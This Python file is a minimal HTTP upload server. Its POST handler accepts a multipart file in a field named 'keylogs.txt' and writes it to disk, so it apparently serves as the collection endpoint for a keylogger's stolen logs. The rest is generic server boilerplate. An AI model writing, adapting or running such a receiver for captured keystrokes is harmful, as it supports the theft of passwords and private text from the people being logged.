from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi, sys, os

UPLOAD_DIR = "."  # The directory where uploaded files will be saved

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>GET request received</h1></body></html>')


    def do_POST(self):
            content_type, _ = cgi.parse_header(self.headers['Content-Type'])
            if content_type == 'multipart/form-data':
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD': 'POST'}
                )

                print(form)
                file_item = form['keylogs.txt']
                if file_item.filename:
                    # Write the file to the server
                    file_path = os.path.join(UPLOAD_DIR, os.path.basename(file_item.filename))
                    with open(file_path, 'wb') as f:
                        f.write(file_item.file.read())
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'File uploaded successfully')
                    return

            # If no file was uploaded or the request was invalid
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Bad request')

def run(server_class=HTTPServer, handler_class=MyHTTPRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 8000
    run(port=port)